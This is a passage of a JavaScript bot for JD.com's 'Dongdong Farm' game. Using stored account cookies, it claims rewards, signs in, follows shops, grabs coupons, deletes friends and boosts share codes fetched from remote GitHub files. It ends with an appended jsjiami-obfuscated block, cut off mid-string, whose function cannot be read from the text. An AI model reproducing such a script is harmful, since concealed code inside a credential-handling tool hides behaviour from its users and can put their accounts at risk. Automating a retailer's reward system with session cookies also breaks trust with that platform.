    if (!$.getdata(helpSuccessPeoplesKey)) {
      //把前一天的清除
      $.setdata('', timeFormat(Date.now() - 24 * 60 * 60 * 1000) + $.farmInfo.farmUserPro.shareCode);
      $.setdata('', helpSuccessPeoplesKey);
    }
    if (helpSuccessPeoples) {
      if ($.getdata(helpSuccessPeoplesKey)) {
        $.setdata($.getdata(helpSuccessPeoplesKey) + ',' + helpSuccessPeoples, helpSuccessPeoplesKey);
      } else {
        $.setdata(helpSuccessPeoples, helpSuccessPeoplesKey);
      }
    }
    helpSuccessPeoples = $.getdata(helpSuccessPeoplesKey);
  }
  if (helpSuccessPeoples && helpSuccessPeoples.length > 0) {
    message += `【您助力的好友👬】${helpSuccessPeoples.substr(0, helpSuccessPeoples.length - 1)}\n`;
  }
  if (salveHelpAddWater > 0) {
    // message += `【助力好友👬】获得${salveHelpAddWater}g💧\n`;
    console.log(`【助力好友👬】获得${salveHelpAddWater}g💧\n`);
  }
  message += `【今日剩余助力👬】${remainTimes}次\n`;
  console.log('助力好友结束，即将开始领取额外水滴奖励\n');
}
//水滴雨
async function executeWaterRains() {
  let executeWaterRain = !$.farmTask.waterRainInit.f;
  if (executeWaterRain) {
    console.log(`水滴雨任务，每天两次，最多可得10g水滴`);
    console.log(`两次水滴雨任务是否全部完成：${$.farmTask.waterRainInit.f ? '是' : '否'}`);
    if ($.farmTask.waterRainInit.lastTime) {
      if (Date.now() < ($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000)) {
        executeWaterRain = false;
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`;
        console.log(`\`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】未到时间，请${new Date($.farmTask.waterRainInit.lastTime + 3 * 60 * 60 * 1000).toLocaleTimeString()}再试\n`);
      }
    }
    if (executeWaterRain) {
      console.log(`开始水滴雨任务,这是第${$.farmTask.waterRainInit.winTimes + 1}次，剩余${2 - ($.farmTask.waterRainInit.winTimes + 1)}次`);
      await waterRainForFarm();
      console.log('水滴雨waterRain');
      if ($.waterRain.code === '0') {
        console.log('水滴雨任务执行成功，获得水滴：' + $.waterRain.addEnergy + 'g');
        console.log(`【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`);
        // message += `【第${$.farmTask.waterRainInit.winTimes + 1}次水滴雨】获得${$.waterRain.addEnergy}g水滴\n`;
      }
    }
  } else {
    // message += `【水滴雨】已全部完成，获得20g💧\n`;
  }
}
//打卡领水活动
async function clockInIn() {
  console.log('开始打卡领水活动（签到，关注，领券）');
  await clockInInitForFarm();
  if ($.clockInInit.code === '0') {
    // 签到得水滴
    if (!$.clockInInit.todaySigned) {
      console.log('开始今日签到');
      await clockInForFarm();
      console.log(`打卡结果${JSON.stringify($.clockInForFarmRes)}`);
      if ($.clockInForFarmRes.code === '0') {
        // message += `【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`;
        console.log(`【第${$.clockInForFarmRes.signDay}天签到】获得${$.clockInForFarmRes.amount}g💧\n`)
        if ($.clockInForFarmRes.signDay === 7) {
          //可以领取惊喜礼包
          console.log('开始领取--惊喜礼包38g水滴');
          await gotClockInGift();
          if ($.gotClockInGiftRes.code === '0') {
            // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
            console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
          }
        }
      }
    }
    if ($.clockInInit.todaySigned && $.clockInInit.totalSigned === 7) {
      console.log('开始领取--惊喜礼包38g水滴');
      await gotClockInGift();
      if ($.gotClockInGiftRes.code === '0') {
        // message += `【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`;
        console.log(`【惊喜礼包】获得${$.gotClockInGiftRes.amount}g💧\n`);
      }
    }
    // 限时关注得水滴
    if ($.clockInInit.themes && $.clockInInit.themes.length > 0) {
      for (let item of $.clockInInit.themes) {
        if (!item.hadGot) {
          console.log(`关注ID${item.id}`);
          await clockInFollowForFarm(item.id, "theme", "1");
          console.log(`themeStep1--结果${JSON.stringify($.themeStep1)}`);
          if ($.themeStep1.code === '0') {
            await clockInFollowForFarm(item.id, "theme", "2");
            console.log(`themeStep2--结果${JSON.stringify($.themeStep2)}`);
            if ($.themeStep2.code === '0') {
              console.log(`关注${item.name}，获得水滴${$.themeStep2.amount}g`);
            }
          }
        }
      }
    }
    // 限时领券得水滴
    if ($.clockInInit.venderCoupons && $.clockInInit.venderCoupons.length > 0) {
      for (let item of $.clockInInit.venderCoupons) {
        if (!item.hadGot) {
          console.log(`领券的ID${item.id}`);
          await clockInFollowForFarm(item.id, "venderCoupon", "1");
          console.log(`venderCouponStep1--结果${JSON.stringify($.venderCouponStep1)}`);
          if ($.venderCouponStep1.code === '0') {
            await clockInFollowForFarm(item.id, "venderCoupon", "2");
            if ($.venderCouponStep2.code === '0') {
              console.log(`venderCouponStep2--结果${JSON.stringify($.venderCouponStep2)}`);
              console.log(`从${item.name}领券，获得水滴${$.venderCouponStep2.amount}g`);
            }
          }
        }
      }
    }
  }
  console.log('开始打卡领水活动（签到，关注，领券）结束\n');
}
//
async function getAwardInviteFriend() {
  await friendListInitForFarm();//查询好友列表
  //console.log(`查询好友列表数据：${JSON.stringify($.friendList)}\n`)
  if ($.friendList) {
    console.log(`\n今日已邀请好友${$.friendList.inviteFriendCount}个 / 每日邀请上限${$.friendList.inviteFriendMax}个`);
    console.log(`开始删除${$.friendList.friends && $.friendList.friends.length}个好友,可拿每天的邀请奖励`);
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      for (let friend of $.friendList.friends) {
        console.log(`\n开始删除好友 [${friend.shareCode}]`);
        const deleteFriendForFarm = await request('deleteFriendForFarm', { "shareCode": `${friend.shareCode}`,"version":8,"channel":1 });
        if (deleteFriendForFarm && deleteFriendForFarm.code === '0') {
          console.log(`删除好友 [${friend.shareCode}] 成功\n`);
        }
      }
    }
    await receiveFriendInvite();//为他人助力,接受邀请成为别人的好友
    if ($.friendList.inviteFriendCount > 0) {
      if ($.friendList.inviteFriendCount > $.friendList.inviteFriendGotAwardCount) {
        console.log('开始领取邀请好友的奖励');
        await awardInviteFriendForFarm();
        console.log(`领取邀请好友的奖励结果：：${JSON.stringify($.awardInviteFriendRes)}`);
      }
    } else {
      console.log('今日未邀请过好友')
    }
  } else {
    console.log(`查询好友列表失败\n`);
  }
}
//给好友浇水
async function doFriendsWater() {
  await friendListInitForFarm();
  console.log('开始给好友浇水...');
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax } = $.farmTask.waterFriendTaskInit;
  console.log(`今日已给${waterFriendCountKey}个好友浇水`);
  if (waterFriendCountKey < waterFriendMax) {
    let needWaterFriends = [];
    if ($.friendList.friends && $.friendList.friends.length > 0) {
      $.friendList.friends.map((item, index) => {
        if (item.friendState === 1) {
          if (needWaterFriends.length < (waterFriendMax - waterFriendCountKey)) {
            needWaterFriends.push(item.shareCode);
          }
        }
      });
      //TODO ,发现bug,github action运行发现有些账号第一次没有给3个好友浇水
      console.log(`需要浇水的好友列表shareCodes:${JSON.stringify(needWaterFriends)}`);
      let waterFriendsCount = 0, cardInfoStr = '';
      for (let index = 0; index < needWaterFriends.length; index ++) {
        await waterFriendForFarm(needWaterFriends[index]);
        console.log(`为第${index+1}个好友浇水结果:${JSON.stringify($.waterFriendForFarmRes)}\n`)
        if ($.waterFriendForFarmRes.code === '0') {
          waterFriendsCount ++;
          if ($.waterFriendForFarmRes.cardInfo) {
            console.log('为好友浇水获得道具了');
            if ($.waterFriendForFarmRes.cardInfo.type === 'beanCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴换豆卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'fastCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `快速浇水卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'doubleCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `水滴翻倍卡,`;
            } else if ($.waterFriendForFarmRes.cardInfo.type === 'signCard') {
              console.log(`获取道具卡:${$.waterFriendForFarmRes.cardInfo.rule}`);
              cardInfoStr += `加签卡,`;
            }
          }
        } else if ($.waterFriendForFarmRes.code === '11') {
          console.log('水滴不够,跳出浇水')
        }
      }
      // message += `【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`;
      console.log(`【好友浇水】已给${waterFriendsCount}个好友浇水,消耗${waterFriendsCount * 10}g水\n`);
      if (cardInfoStr && cardInfoStr.length > 0) {
        // message += `【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`;
        console.log(`【好友浇水奖励】${cardInfoStr.substr(0, cardInfoStr.length - 1)}\n`);
      }
    } else {
      console.log('您的好友列表暂无好友,快去邀请您的好友吧!')
    }
  } else {
    console.log(`今日已为好友浇水量已达${waterFriendMax}个`)
  }
}
//领取给3个好友浇水后的奖励水滴
async function getWaterFriendGotAward() {
  await taskInitForFarm();
  const { waterFriendCountKey, waterFriendMax, waterFriendSendWater, waterFriendGotAward } = $.farmTask.waterFriendTaskInit
  if (waterFriendCountKey >= waterFriendMax) {
    if (!waterFriendGotAward) {
      await waterFriendGotAwardForFarm();
      console.log(`领取给${waterFriendMax}个好友浇水后的奖励水滴::${JSON.stringify($.waterFriendGotAwardRes)}`)
      if ($.waterFriendGotAwardRes.code === '0') {
        // message += `【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`;
        console.log(`【给${waterFriendMax}好友浇水】奖励${$.waterFriendGotAwardRes.addWater}g水滴\n`);
      }
    } else {
      console.log(`给好友浇水的${waterFriendSendWater}g水滴奖励已领取\n`);
      // message += `【给${waterFriendMax}好友浇水】奖励${waterFriendSendWater}g水滴已领取\n`;
    }
  } else {
    console.log(`暂未给${waterFriendMax}个好友浇水\n`);
  }
}
//接收成为对方好友的邀请
async function receiveFriendInvite() {
  for (let code of newShareCodes) {
    if (code === $.farmInfo.farmUserPro.shareCode) {
      console.log('自己不能邀请自己成为好友噢\n')
      continue
    }
    await inviteFriend(code);
    // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
    if ($.inviteFriendRes.helpResult.code === '0') {
      console.log(`接收邀请成为好友结果成功,您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
    } else if ($.inviteFriendRes.helpResult.code === '17') {
      console.log(`接收邀请成为好友结果失败,对方已是您的好友`)
    }
  }
  // console.log(`开始接受6fbd26cc27ac44d6a7fed34092453f77的邀请\n`)
  // await inviteFriend('6fbd26cc27ac44d6a7fed34092453f77');
  // console.log(`接收邀请成为好友结果:${JSON.stringify($.inviteFriendRes.helpResult)}`)
  // if ($.inviteFriendRes.helpResult.code === '0') {
  //   console.log(`您已成为${$.inviteFriendRes.helpResult.masterUserInfo.nickName}的好友`)
  // } else if ($.inviteFriendRes.helpResult.code === '17') {
  //   console.log(`对方已是您的好友`)
  // }
}
async function duck() {
  for (let i = 0; i < 10; i++) {
    //这里循环十次
    await getFullCollectionReward();
    if ($.duckRes.code === '0') {
      if (!$.duckRes.hasLimit) {
        console.log(`小鸭子游戏:${$.duckRes.title}`);
        // if ($.duckRes.type !== 3) {
        //   console.log(`${$.duckRes.title}`);
        //   if ($.duckRes.type === 1) {
        //     message += `【小鸭子】为你带回了水滴\n`;
        //   } else if ($.duckRes.type === 2) {
        //     message += `【小鸭子】为你带回快速浇水卡\n`
        //   }
        // }
      } else {
        console.log(`${$.duckRes.title}`)
        break;
      }
    } else if ($.duckRes.code === '10') {
      console.log(`小鸭子游戏达到上限`)
      break;
    }
  }
}
// ========================API调用接口========================
//鸭子，点我有惊喜
async function getFullCollectionReward() {
  return new Promise(resolve => {
    const body = {"type": 2, "version": 6, "channel": 2};
    $.post(taskUrl("getFullCollectionReward", body), (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.duckRes = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

/**
 * 领取10次浇水奖励API
 */
async function totalWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.totalWaterReward = await request(functionId);
}
//领取首次浇水奖励API
async function firstWaterTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.firstWaterReward = await request(functionId);
}
//领取给3个好友浇水后的奖励水滴API
async function waterFriendGotAwardForFarm() {
  const functionId = arguments.callee.name.toString();
  $.waterFriendGotAwardRes = await request(functionId, {"version": 4, "channel": 1});
}
// 查询背包道具卡API
async function myCardInfoForFarm() {
  const functionId = arguments.callee.name.toString();
  $.myCardInfoRes = await request(functionId, {"version": 5, "channel": 1});
}
//使用道具卡API
async function userMyCardForFarm(cardType) {
  const functionId = arguments.callee.name.toString();
  $.userMyCardRes = await request(functionId, {"cardType": cardType});
}
/**
 * 领取浇水过程中的阶段性奖励
 * @param type
 * @returns {Promise<void>}
 */
async function gotStageAwardForFarm(type) {
  $.gotStageAwardForFarmRes = await request(arguments.callee.name.toString(), {'type': type});
}
//浇水API
async function waterGoodForFarm() {
  await $.wait(1000);
  console.log('等待了1秒');

  const functionId = arguments.callee.name.toString();
  $.waterResult = await request(functionId);
}
// 初始化集卡抽奖活动数据API
async function initForTurntableFarm() {
  $.initForTurntableFarmRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}
async function lotteryForTurntableFarm() {
  await $.wait(2000);
  console.log('等待了2秒');
  $.lotteryRes = await request(arguments.callee.name.toString(), {type: 1, version: 4, channel: 1});
}

async function timingAwardForTurntableFarm() {
  $.timingAwardRes = await request(arguments.callee.name.toString(), {version: 4, channel: 1});
}

async function browserForTurntableFarm(type, adId) {
  if (type === 1) {
    console.log('浏览爆品会场');
  }
  if (type === 2) {
    console.log('天天抽奖浏览任务领取水滴');
  }
  const body = {"type": type,"adId": adId,"version":4,"channel":1};
  $.browserForTurntableFarmRes = await request(arguments.callee.name.toString(), body);
  // 浏览爆品会场8秒
}
//天天抽奖浏览任务领取水滴API
async function browserForTurntableFarm2(type) {
  const body = {"type":2,"adId": type,"version":4,"channel":1};
  $.browserForTurntableFarm2Res = await request('browserForTurntableFarm', body);
}
/**
 * 天天抽奖拿好礼-助力API(每人每天三次助力机会)
 */
async function lotteryMasterHelp() {
  $.lotteryMasterHelpRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-3',
    babelChannel: "3",
    version: 4,
    channel: 1
  });
}

//领取5人助力后的额外奖励API
async function masterGotFinishedTaskForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterGotFinished = await request(functionId);
}
//助力好友信息API
async function masterHelpTaskInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.masterHelpResult = await request(functionId);
}
//接受对方邀请,成为对方好友的API
async function inviteFriend() {
  $.inviteFriendRes = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0] + '-inviteFriend',
    version: 4,
    channel: 2
  });
}
// 助力好友API
async function masterHelp() {
  $.helpResult = await request(`initForFarm`, {
    imageUrl: "",
    nickName: "",
    shareCode: arguments[0],
    babelChannel: "3",
    version: 2,
    channel: 1
  });
}
/**
 * 水滴雨API
 */
async function waterRainForFarm() {
  const functionId = arguments.callee.name.toString();
  const body = {"type": 1, "hongBaoTimes": 100, "version": 3};
  $.waterRain = await request(functionId, body);
}
/**
 * 打卡领水API
 */
async function clockInInitForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInInit = await request(functionId);
}

// 连续签到API
async function clockInForFarm() {
  const functionId = arguments.callee.name.toString();
  $.clockInForFarmRes = await request(functionId, {"type": 1});
}

//关注，领券等API
async function clockInFollowForFarm(id, type, step) {
  const functionId = arguments.callee.name.toString();
  let body = {
    id,
    type,
    step
  }
  if (type === 'theme') {
    if (step === '1') {
      $.themeStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.themeStep2 = await request(functionId, body);
    }
  } else if (type === 'venderCoupon') {
    if (step === '1') {
      $.venderCouponStep1 = await request(functionId, body);
    } else if (step === '2') {
      $.venderCouponStep2 = await request(functionId, body);
    }
  }
}

// 领取连续签到7天的惊喜礼包API
async function gotClockInGift() {
  $.gotClockInGiftRes = await request('clockInForFarm', {"type": 2})
}

//定时领水API
async function gotThreeMealForFarm() {
  const functionId = arguments.callee.name.toString();
  $.threeMeal = await request(functionId);
}
/**
 * 浏览广告任务API
 * type为0时, 完成浏览任务
 * type为1时, 领取浏览任务奖励
 */
async function browseAdTaskForFarm(advertId, type) {
  const functionId = arguments.callee.name.toString();
  if (type === 0) {
    $.browseResult = await request(functionId, {advertId, type});
  } else if (type === 1) {
    $.browseRwardResult = await request(functionId, {advertId, type});
  }
}
// 被水滴砸中API
async function gotWaterGoalTaskForFarm() {
  $.goalResult = await request(arguments.callee.name.toString(), {type: 3});
}
//签到API
async function signForFarm() {
  const functionId = arguments.callee.name.toString();
  $.signResult = await request(functionId);
}
/**
 * 初始化农场, 可获取果树及用户信息API
 */
async function initForFarm() {
  return new Promise(resolve => {
    const option =  {
      url: `${JD_API_HOST}?functionId=initForFarm`,
      body: `body=${escape(JSON.stringify({"version":4}))}&appid=wh5&clientVersion=9.1.0`,
      headers: {
        "accept": "*/*",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "zh-CN,zh;q=0.9",
        "cache-control": "no-cache",
        "cookie": cookie,
        "origin": "https://home.m.jd.com",
        "pragma": "no-cache",
        "referer": "https://home.m.jd.com/myJd/newhome.action",
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
        "Content-Type": "application/x-www-form-urlencoded"
      },
      timeout: 10000,
    };
    $.post(option, (err, resp, data) => {
      try {
        if (err) {
          console.log('\n东东农场: API查询请求失败 ‼️‼️');
          console.log(JSON.stringify(err));
          $.logErr(err);
        } else {
          if (safeGet(data)) {
            $.farmInfo = JSON.parse(data)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}

// 初始化任务列表API
async function taskInitForFarm() {
  console.log('\n初始化任务列表')
  const functionId = arguments.callee.name.toString();
  $.farmTask = await request(functionId);
}
//获取好友列表API
async function friendListInitForFarm() {
  $.friendList = await request('friendListInitForFarm', {"version": 4, "channel": 1});
  // console.log('aa', aa);
}
// 领取邀请好友的奖励API
async function awardInviteFriendForFarm() {
  $.awardInviteFriendRes = await request('awardInviteFriendForFarm');
}
//为好友浇水API
async function waterFriendForFarm(shareCode) {
  const body = {"shareCode": shareCode, "version": 6, "channel": 1}
  $.waterFriendForFarmRes = await request('waterFriendForFarm', body);
}
async function showMsg() {
  if ($.isNode() && process.env.FRUIT_NOTIFY_CONTROL) {
    $.ctrTemp = `${process.env.FRUIT_NOTIFY_CONTROL}` === 'false';
  } else if ($.getdata('jdFruitNotify')) {
    $.ctrTemp = $.getdata('jdFruitNotify') === 'false';
  } else {
    $.ctrTemp = `${jdNotify}` === 'false';
  }
  if ($.ctrTemp) {
    $.msg($.name, subTitle, message, option);
    if ($.isNode()) {
      allMessage += `${subTitle}\n${message}${$.index !== cookiesArr.length ? '\n\n' : ''}`;
      // await notify.sendNotify(`${$.name} - 账号${$.index} - ${$.nickName}`, `${subTitle}\n${message}`);
    }
  } else {
    $.log(`\n${message}\n`);
  }
}

function timeFormat(time) {
  let date;
  if (time) {
    date = new Date(time)
  } else {
    date = new Date();
  }
  return date.getFullYear() + '-' + ((date.getMonth() + 1) >= 10 ? (date.getMonth() + 1) : '0' + (date.getMonth() + 1)) + '-' + (date.getDate() >= 10 ? date.getDate() : '0' + date.getDate());
}
function readShareCode() {
  console.log(`开始`)
  return new Promise(async resolve => {
    $.get({url: "https://cdn.jsdelivr.net/gh/wuzhi-docker1/RandomShareCode@main/JD_Fruit.json",headers:{
        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1 Edg/87.0.4280.88"
      }}, async (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，将切换为备用API`)
          console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
          $.get({url: `https://raw.githubusercontent.com/shuyeshuye/RandomShareCode/main/JD_Fruit.json`, 'timeout': 10000},(err, resp, data)=>{
          data = JSON.parse(data);})
        } else {
          if (data) {
            console.log(`随机取助力码放到您固定的互助码后面(不影响已有固定互助)`)
            data = JSON.parse(data);
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve(data);
      }
    })
    await $.wait(10000);
    resolve()
  })
}
function shareCodesFormat() {
  return new Promise(async resolve => {
    // console.log(`第${$.index}个京东账号的助力码:::${jdFruitShareArr[$.index - 1]}`)
    newShareCodes = [];
    if (jdFruitShareArr[$.index - 1]) {
      newShareCodes = jdFruitShareArr[$.index - 1].split('@');
    } else {
      console.log(`由于您第${$.index}个京东账号未提供shareCode,将采纳本脚本自带的助力码\n`)
      const tempIndex = $.index > shareCodes.length ? (shareCodes.length - 1) : ($.index - 1);
      newShareCodes = shareCodes[tempIndex].split('@');
    }
    const readShareCodeRes = await readShareCode();
    if (readShareCodeRes && readShareCodeRes.code === 200) {
      // newShareCodes = newShareCodes.concat(readShareCodeRes.data || []);
      newShareCodes = [...new Set([...newShareCodes, ...(readShareCodeRes.data || [])])];
    }
    console.log(`第${$.index}个京东账号将要助力的好友${JSON.stringify(newShareCodes)}`)
    resolve();
  })
}
function requireConfig() {
  return new Promise(resolve => {
    console.log('开始获取配置文件\n')
    notify = $.isNode() ? require('./sendNotify') : '';
    //Node.js用户请在jdCookie.js处填写京东ck;
    const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
    const jdFruitShareCodes = $.isNode() ? require('./jdFruitShareCodes.js') : '';
    //IOS等用户直接用NobyDa的jd cookie
    if ($.isNode()) {
      Object.keys(jdCookieNode).forEach((item) => {
        if (jdCookieNode[item]) {
          cookiesArr.push(jdCookieNode[item])
        }
      })
      if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
    } else {
      let cookiesData = $.getdata('CookiesJD') || "[]";
      cookiesData = jsonParse(cookiesData);
      cookiesArr = cookiesData.map(item => item.cookie);
      cookiesArr.reverse();
      cookiesArr.push(...[$.getdata('CookieJD2'), $.getdata('CookieJD')]);
      cookiesArr.reverse();
      cookiesArr = cookiesArr.filter(item => item !== "" && item !== null && item !== undefined);
    }
    console.log(`共${cookiesArr.length}个京东账号\n`)
    if ($.isNode()) {
      Object.keys(jdFruitShareCodes).forEach((item) => {
        if (jdFruitShareCodes[item]) {
          jdFruitShareArr.push(jdFruitShareCodes[item])
        }
      })
    } else {
      const boxShareCodeArr = ['jd_fruit1', 'jd_fruit2', 'jd_fruit3', 'jd_fruit4'];
      const boxShareCodeArr2 = ['jd2_fruit1', 'jd2_fruit2', 'jd2_fruit3', 'jd2_fruit4'];
      const isBox1 = boxShareCodeArr.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      const isBox2 = boxShareCodeArr2.some((item) => {
        const boxShareCode = $.getdata(item);
        return (boxShareCode !== undefined && boxShareCode !== null && boxShareCode !== '');
      });
      isBox = isBox1 ? isBox1 : isBox2;
      if (isBox1) {
        let temp = [];
        for (const item of boxShareCodeArr) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
      if (isBox2) {
        let temp = [];
        for (const item of boxShareCodeArr2) {
          if ($.getdata(item)) {
            temp.push($.getdata(item))
          }
        }
        jdFruitShareArr.push(temp.join('@'));
      }
    }
    // console.log(`jdFruitShareArr::${JSON.stringify(jdFruitShareArr)}`)
    // console.log(`jdFruitShareArr账号长度::${jdFruitShareArr.length}`)
    console.log(`您提供了${jdFruitShareArr.length}个账号的农场助力码\n`);
    resolve()
  })
}
function TotalBean() {
  return new Promise(async resolve => {
    const options = {
      "url": `https://wq.jd.com/user/info/QueryJDUserInfo?sceneval=2`,
      "headers": {
        "Accept": "application/json,text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-cn",
        "Connection": "keep-alive",
        "Cookie": cookie,
        "Referer": "https://wqs.jd.com/my/jingdou/my.shtml?sceneval=2",
        "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0")
      },
      "timeout": 10000,
    }
    $.post(options, (err, resp, data) => {
      try {
        if (err) {
          console.log(`${JSON.stringify(err)}`)
          console.log(`${$.name} API请求失败，请检查网路重试`)
        } else {
          if (data) {
            data = JSON.parse(data);
            if (data['retcode'] === 13) {
              $.isLogin = false; //cookie过期
              return
            }
            if (data['retcode'] === 0) {
              $.nickName = data['base'].nickname;
            } else {
              $.nickName = $.UserName
            }
          } else {
            console.log(`京东服务器返回空数据`)
          }
        }
      } catch (e) {
        $.logErr(e, resp)
      } finally {
        resolve();
      }
    })
  })
}
function request(function_id, body = {}, timeout = 1000){
  return new Promise(resolve => {
    setTimeout(() => {
      $.get(taskUrl(function_id, body), (err, resp, data) => {
        try {
          if (err) {
            console.log('\n东东农场: API查询请求失败 ‼️‼️')
            console.log(JSON.stringify(err));
            console.log(`function_id:${function_id}`)
            $.logErr(err);
          } else {
            if (safeGet(data)) {
              data = JSON.parse(data);
            }
          }
        } catch (e) {
          $.logErr(e, resp);
        } finally {
          resolve(data);
        }
      })
    }, timeout)
  })
}
function safeGet(data) {
  try {
    if (typeof JSON.parse(data) == "object") {
      return true;
    }
  } catch (e) {
    console.log(e);
    console.log(`京东服务器访问数据为空，请检查自身设备网络情况`);
    return false;
  }
}
function taskUrl(function_id, body = {}) {
  return {
    url: `${JD_API_HOST}?functionId=${function_id}&appid=wh5&body=${escape(JSON.stringify(body))}`,
    headers: {
      Cookie: cookie,
      UserAgent: $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.2.2;14.2;%E4%BA%AC%E4%B8%9C/9.2.2 CFNetwork/1206 Darwin/20.1.0"),
    },
    timeout: 10000,
  }
}
function jsonParse(str) {
  if (typeof str == "string") {
    try {
      return JSON.parse(str);
    } catch (e) {
      console.log(e);
      $.msg($.name, '', '请勿随意在BoxJs输入框修改内容\n建议通过脚本去获取cookie')
      return [];
    }
  }
}
var _0xodc='jsjiami.com.v6',_0x210a=[_0xodc,'GsOucjx+','w79sw5rChMKF','wrcuw6t8TQ==','TicQwp9d','w5bDrhUcccKvd8KHwp18WsOGw7DCn8ORfMOew4rCicKBw6PDmcKNCsKfw4HDvsKpw5EBwr3DiMKGwr/DlMKYGn9vER89wrgcejbCs8KtZ8K7BsKQw5HCm8KeGirDnMOXRlbCgwrCnHjDtyQX','WgLCtHwmIlHCmGdFZlxmZTk2N8OaUD3CqcKjw7xiwo82woXDi8OVWMOUOsOCwqB7wrhLc8OwwoBUwr7DjMKVw4ccwrobw6l6fMKoC8KNcxE7TmckwrnDrMKcwpIbdMKPw7bCqcO0dMOCwo3CtsKDTMO4wp3CosKGAC7CgsOMLlTDjsKhw4VMM8KVIExmwr1aw5vCuCl1wqXCm8Ovw6wkwp95eRFTVMOowrzChcOfw6rDpzvCrsK1UMKaTjTCg8KTwq4ZTsKqwr3DuMOLw7/CjHVywpzDlX3DgMKCwoNTUMOuwq1vwp/Cvy8Bw4RYZQ==','PVBJCQI=','Umd5wrNs','w6nCmxjDh8Ko','w4hiwpEkwoM=','CMKuwqzDgsKL','JRfCiw==','w65Bw7XDsDA=','LcKWwpBbNQ==','w67Cu3Afwpo=','DFDCm8Knwoo=','aMO/MnjCnA==','w6Viw7vCgQU=','wro+w60=','amDDois=','aMOnI3forrbmsJPlp7Pot4Hvv4zorb3moq/mn53nv6XotpzphIHorKk=','wrYSwpQfAg==','SsOIN37CnMKDwq8=','wqYww7gOw5M=','w6LChUkvEQ==','wrwIw6pGanQK','wofCvzEMNEM=','IsOHAW42','DQLCmsOFcQs4wpjDujcbQGs=','EMKpwpwew6LCrg==','woZ4YQMIwqfCsg==','w79AwqcowplhK1oswo/DmyHDvg==','woLDgMOuw7c=','wq8Ww5jCo2Y=','woovw4xYbA==','w7HDnsKXbsK5','LsOdTcOFXQ==','w6tjwonCqHHDrg==','aG7DqA==','GFNoKA==','wqLCt0wE6Kyk5rOD5aSu6LSL77yR6Ky15qO55p2B57yd6LaZ6YW36K61','w4xuwqLCqVM=','I8KLw4dMw4Q=','TMORL2